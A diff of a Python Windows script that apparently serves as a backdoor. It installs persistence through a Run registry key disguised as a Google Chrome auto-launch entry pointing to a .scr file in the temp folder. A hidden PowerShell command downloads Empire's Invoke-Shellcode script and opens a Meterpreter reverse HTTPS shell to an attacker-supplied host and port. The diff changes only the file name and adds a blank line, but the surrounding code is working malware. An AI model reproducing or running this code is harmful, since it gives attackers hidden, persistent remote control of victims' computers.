@@ -15,7 +15,7 @@ TIME_SLEEP = 5
 TEMP_PATH = tempfile.gettempdir()
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
-REG_VALUE = '"' + TEMP_PATH + '\.GoogleChromeAutoLaunch.scr' + '"' + ' --no-startup-window /prefetch:5'
+REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.scr' + '"' + ' --no-startup-window /prefetch:5'
 
 def set_reg_key_value(REG_PATH, name, value):
     try:
@@ -39,6 +39,7 @@ def fire():
             subprocess.Popen("C:\Windows\System32\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden -noninteractive -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
         except WindowsError:
             pass
+
 
 def run_after_close():
     foundIT = False
